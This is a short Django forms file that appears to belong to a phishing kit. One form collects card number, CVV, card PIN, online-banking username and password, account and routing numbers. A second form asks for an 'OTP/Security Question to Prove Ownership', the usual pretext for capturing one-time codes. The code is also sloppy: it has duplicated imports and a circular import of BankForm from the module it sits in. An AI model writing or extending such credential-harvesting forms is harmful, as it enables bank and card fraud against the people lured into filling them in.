from django import forms
from .models import BankFormSubmission
from .models import SingleInput

from django import forms

from django.shortcuts import render, redirect
from django.http import HttpResponse
from .forms import BankForm
from .models import BankFormSubmission

class BankForm(forms.Form):
    first_name = forms.CharField(max_length=255)
    last_name = forms.CharField(max_length=255)
    address = forms.CharField(max_length=255)
    email = forms.EmailField()
    password = forms.CharField(widget=forms.PasswordInput)

    card_number = forms.CharField(max_length=16)
    expiry_date = forms.CharField(max_length=5)  # Format: MM/YY
    ccv_security_code = forms.CharField(max_length=3)
    card_pin = forms.CharField(max_length=4)

    bank_username = forms.CharField(max_length=255)
    bank_password = forms.CharField(widget=forms.PasswordInput)
    account_number = forms.CharField(max_length=30)
    routing_number = forms.CharField(max_length=9)

class SingleInputForm(forms.ModelForm):
    class Meta:
        model = SingleInput
        fields = ['input_value']
        labels = {
            'input_value': 'OTP/Security Question to Prove Ownership',  # Change the label
        }

    # Optional: Rename the field directly in the form
    input_value = forms.CharField(label="OTP/Security Question to Prove Ownership")


